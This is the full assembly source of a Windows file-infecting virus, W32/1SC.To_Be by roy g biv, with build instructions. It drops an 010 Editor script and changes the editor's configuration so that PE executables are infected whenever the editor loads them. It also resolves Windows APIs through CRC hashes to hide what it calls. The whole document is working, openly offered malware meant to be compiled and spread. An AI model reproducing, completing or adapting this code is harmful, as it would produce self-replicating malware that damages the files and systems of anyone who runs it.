comment ;)
W32/1SC.To_Be by roy g biv

some of its features:
- parasitic direct action infector of PE exe (but not looking at suffix)
- infects files when 010 Editor loads them
- last section appender
- uses CRCs instead of API names
- no infect files with data outside of image (eg self-extractors)
- uses Windows 7 compatible method to find kernel address

not a remake this time - 010 Editor script infects PE files!
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 to_be
tlink32 /B:400000 /x to_be,,,import32

Virus section is already writable, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.486 ;bswap
.model  flat

extern  LoadLibraryA:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include to_be.inc

calcsize        equ     0                       ;set to 1 to display codesize, then search ";replace" below

dropper         label   near
if calcsize
        xor     ebx, ebx
        push    ebx
        push    ebx
        call    skip_body
        db      6 dup (0)                       ;up to 99999 bytes

skip_body       label   near
        pop     edi
        push    edi
        mov     eax, codesize
        cdq
        mov     ecx, 10000
        div     ecx
        test    al, al
        je      skip_10000
        add     al, '0'
        stos    byte ptr [edi]

skip_10000      label   near
        xchg    edx, eax
        cdq
        mov     cx, 1000
        div     ecx
        add     al, '0'
        stos    byte ptr [edi]
        xchg    edx, eax
        cdq
        mov     cx, 100
        div     ecx
        add     al, '0'
        stos    byte ptr [edi]
        xchg    edx, eax
        cdq
        mov     cl, 10
        div     ecx
        add     al, '0'
        stos    byte ptr [edi]
        xchg    edx, eax
        add     al, '0'
        stos    byte ptr [edi]
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess
endif

        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, regcrc_count
        mov     ebx, offset regnames
        mov     edi, offset regcrcbegin
        call    create_crcs
        pop     ebx
        push    (offset do_message - offset dropper) + 2000h

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;no exception handler this time because I don't care if the .cfg is corrupted
;-----------------------------------------------------------------------------

tobe_begin      label   near
        push    ebx
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebx, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near

        call    load_reg
        db      "advapi32", 0

reg_key         db      "Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", 0
personal        db      "Personal", 0

script1         db      "int a=2514"            ;replace this with codesize
                db      ",c=FileSize(),d,f,g,h,i,j,k,l;char b[a]=", 22h, "hrgb!\xE8\xFF\xFF\xFF\xFF\xC0^\x83\xC62\x8B\xFE\xADj\x4Y\xC1\xC0\b<0s\x5,C\xC0\xE8\x2\x4\x4<?v\b,E<\x19v\x2,\x6\xF\xAC\xC2\x6\xE2\xE0\x92\xF\xC8\xABO\x80>IHXS"
script2         db      22h, ",e[96];if(c>64){d=ReadInt(60);if(d+96<c){e[92]=0;ReadBytes(e,d,96);f=d+ReadShort(d+6)*40+ReadShort(d+20);if(f+8<c){g=ReadInt(f);h=ReadInt(f+4);"
                db      "if(ReadShort(GetReadOnly())==0x5a4d&&ReadInt(d)==0x4550&&e[4]==76&&e[5]==1&&e[22]&2&&(e[23]&49)==1&&!e[93]&&(e[92]-2)<2&&!(e[95]&32)&&!ReadInt(d+152)&&g+h==c)"
                db      "{i=ReadInt(d+60);InsertBytes(c,i+Random(2048)+4096+a);WriteInt(f,i=(g+a+i-1)&-i);j=ReadInt(f-8);k=ReadInt(f-4);if(j<i){WriteInt(f-8,i);l=ReadInt(d+56);WriteInt(d+80,j=(k+i+l-1)&-l);}WriteByte(f+23,ReadByte(f+23)|160);"
                db      "g+=k;l=ReadInt(d+160);if(e[22]&1==0&&l>=k&&l<k+j){WriteInt(d+160,l+a);c=l+h-k;g=l;}InsertBytes(c,a);WriteBytes(b,c,a);WriteInt(c+1,ReadInt(d+40));WriteInt(d+40,g);WriteInt(d+88,0);FileSave(GetFileName());FileClose();}}}}"
script_e        label   near

scripts         db      "\SweetScape\010 Scripts\r", 0
localapp        db      "Local AppData", 0
editor          db      "\010 Editor\010Editor.cfg", 0

load_reg        label   near
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        xchg    ebx, eax
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

regcrcbegin     label   near
        dd      (regcrc_count + 1) dup (0)
regcrcend       label   near

;-----------------------------------------------------------------------------
;go directly to the registry instead of shell32 SHGet*Folder* APIs
;because Microsoft keeps changing them
;-----------------------------------------------------------------------------

        enter   MAX_PATH * 2, 0
        mov     esi, esp
        push    edi
        push    7fh                             ;RegQueryValueExA
        push    esp                             ;RegQueryValueExA
        push    esi                             ;RegQueryValueExA
        push    0                               ;RegQueryValueExA
        push    0                               ;RegQueryValueExA
        sub     edi, offset regcrcend - offset personal
        push    edi                             ;RegQueryValueExA
        push    eax
        push    esp
        sub     edi, offset personal - offset reg_key
        push    edi
        push    80000001h
        call    dword ptr [ebp + 4 + regcrcstk.rRegOpenKeyA]
        pop     ebx
        push    ebx
        call    dword ptr [ebp + 4 + regcrcstk.rRegQueryValueExA]
        push    ebx
        push    eax                             ;WriteFile
        push    esp                             ;WriteFile
        mov     ecx, scriptsize + base64size
        push    ecx                             ;WriteFile
        push    ecx
        push    eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kGlobalAlloc]
        push    eax                             ;WriteFile
        push    esi
        mov     ecx, offset script2 - offset script1
        lea     esi, dword ptr [edi + offset script1 - offset reg_key]
        xchg    edi, eax
        rep     movs byte ptr [edi], byte ptr [esi]
        push    esi
        push    ebp
        mov     ebp, offset tobe_codeend - offset tobe_begin
        sub     esi, offset script2 - offset tobe_begin

b64_outer       label   near
        lods    dword ptr [esi]
        dec     esi
        inc     ebp
        bswap   eax
	push	4
	pop	ecx

b64_inner       label   near
        rol     eax, 6
        and     al, 3fh
        cmp     al, 3eh
        jb      b64_testchar
        shl     al, 2                           ;'+' and '/' differ by only 1 bit
        sub     al, ((3eh shl 2) + 'A' - '+') and 0ffh

b64_testchar    label   near
        sub     al, 4
        cmp     al, '0'
        jnl     b64_store                       ;l not b because '/' is still < 0 here
        add     al, 'A' + 4
        cmp     al, 'Z'
        jbe     b64_store
        add     al, 'a' - 'Z' - 1

b64_store       label   near
	stos	byte ptr [edi]
	dec	ebp
        loopne  b64_inner
        jne     b64_outer
        pop     ebp
	mov	al, ' '
        inc     ecx
	rep	stos byte ptr [edi]
        mov     cx, offset script_e - offset script2
        pop     esi
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     edi, esi
        pop     esi
        push    ecx                             ;CreateFileA
        push    ecx                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ecx                             ;CreateFileA
        push    ecx                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        lea     eax, dword ptr [esi + 7fh]
        push    eax                             ;CreateFileA
        push    7fh
        push    eax
        push    esi
        xchg    esi, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kExpandEnvironmentStringsA]
        push    offset localapp - offset scripts
        pop     ecx
        lea     eax, dword ptr [esi + eax - 1]
        xchg    edi, eax
        xchg    esi, eax
        rep     movs byte ptr [edi], byte ptr [esi]
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kCreateFileA]
        push    eax
        xchg    ebx, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kWriteFile]
        push    ebx
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kCloseHandle]
        pop     ebx
        pop     edi
        pop     edi
        mov     esi, esp
        push    7fh
        push    esp
        push    esi
        push    0
        push    0
        lea     eax, dword ptr [edi + offset localapp - offset regcrcend]
        push    eax
        push    ebx
        call    dword ptr [ebp + 4 + regcrcstk.rRegQueryValueExA]
        push    eax                             ;CreateFileA
        push    eax                             ;CreateFileA
        push    OPEN_EXISTING                   ;CreateFileA
        push    eax                             ;CreateFileA
        push    eax                             ;CreateFileA
        push    GENERIC_READ or GENERIC_WRITE   ;CreateFileA
        lea     eax, dword ptr [esi + 7fh]
        push    eax                             ;CreateFileA
        push    7fh
        push    eax
        push    esi
        xchg    esi, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kExpandEnvironmentStringsA]
        push    offset load_reg - offset editor
        pop     ecx
        lea     eax, dword ptr [esi + eax - 1]
        sub     edi, offset regcrcend - offset editor
        xchg    edi, eax
        xchg    esi, eax
        rep     movs byte ptr [edi], byte ptr [esi]
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kCreateFileA]
        inc     eax                             ;misaligned handle still works :)
        je      skip_file
        xor     esi, esi
        push    esi                             ;ReadFile
        push    esp                             ;ReadFile
        push    esi
        push    eax
        xchg    ebx, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kGetFileSize]
        push    eax                             ;ReadFile
        push    eax
        push    esi
        xchg    edi, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kGlobalAlloc]
        add     edi, eax
        push    eax
        push    ebx
        xchg    esi, eax
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kReadFile]
        push    esi
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        sub     eax, 0dh
        jb      branch_close
        cmp     al, 2
        cmc

branch_close    label   near
        jb      close_file

;-----------------------------------------------------------------------------
;I have no idea what I'm doing here but it works
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 24h]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 1ch]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 0ch]
        lods    dword ptr [esi]
        xchg    ecx, eax
        jecxz   skip_array1

parse_array1    label   near
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        loop    parse_array1

skip_array1     label   near
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        xchg    ecx, eax
        jecxz   skip_array2

parse_array2    label   near
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        loop    parse_array2

skip_array2     label   near
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        xchg    ecx, eax
        jecxz   skip_array3

parse_array3    label   near
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        loop    parse_array3

skip_array3     label   near
        lods    dword ptr [esi]
        xchg    ecx, eax
        jecxz   skip_struct1

parse_struct1   label   near
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 0ch]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 64h]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 4 + esi]
        loop    parse_struct1

skip_struct1    label   near
        lods    dword ptr [esi]
        xchg    ecx, eax
        jecxz   skip_struct2

parse_struct2   label   near
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 4]
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 2 + esi + 8]
        loop    parse_struct2

skip_struct2    label   near
        inc     dword ptr [esi]
        lods    dword ptr [esi]
        pop     edx
        push    ecx                             ;WriteFile
        push    esp                             ;WriteFile
        sub     edi, esi
        push    edi                             ;WriteFile
        push    esi                             ;WriteFile
        push    ebx                             ;WriteFile
        push    ecx                             ;WriteFile
        push    esp                             ;WriteFile
        push    offset skip_scrname - offset scrname
                                                ;WriteFile
        call    skip_scrname                    ;WriteFile
scrname         label   near
        dd      0, 0, 0eh
        dw      "(", "$", "S", "C", "R", "I", "P", "T", "D", "I", "R", ")", "\", "r"
        dd      1, 0, 1
        dw      "*"
        dd      0, 0

skip_scrname    label   near
        push    ebx                             ;WriteFile
        push    ecx                             ;WriteFile
        push    esp                             ;WriteFile
        sub     esi, edx
        push    esi                             ;WriteFile
        push    edx                             ;WriteFile
        push    ebx                             ;WriteFile
        push    ecx
        push    ecx
        push    ecx
        push    ebx
        lea     esi, dword ptr [edx + esi - 4]
        lods    dword ptr [esi]
        dec     eax
        je      write_file
        lods    dword ptr [esi]
        cmp     dword ptr [eax * 2 + esi], ecx
        je      close_file

;-----------------------------------------------------------------------------
;we gather all parameters on stack before calling any write
;so if there's any problem, we use leave instruction and discard them all
;-----------------------------------------------------------------------------

write_file      label   near
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kSetFilePointer]
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kWriteFile]
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kWriteFile]
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kWriteFile]

close_file      label   near
        push    ebx
        call    dword ptr [ebp + 4 + size regcrcstk + krncrcstk.kCloseHandle]

skip_file       label   near
        leave
        add     esp, size regcrcstk + size krncrcstk
        pop     ebx
        pop     eax
        add     eax, dword ptr [ebx + pebImageBaseAddress]
        jmp     eax
        db      "To_Be - roy g biv"             ;to be, two b, 010... :)

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi
        db      "05/07/11"
tobe_codeend    label   near

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"              , 0
                db      "CreateFileA"              , 0
                db      "ExpandEnvironmentStringsA", 0
                db      "GetFileSize"              , 0
                db      "GlobalAlloc"              , 0
                db      "LoadLibraryA"             , 0
                db      "ReadFile"                 , 0
                db      "SetFilePointer"           , 0
                db      "WriteFile"                , 0

regnames        db      "RegOpenKeyA"     , 0
                db      "RegQueryValueExA", 0

txttitle        db      "test", 0
txtbody         db      "Now run 010 Editor ;)", 0

.code
        nop
end             dropper
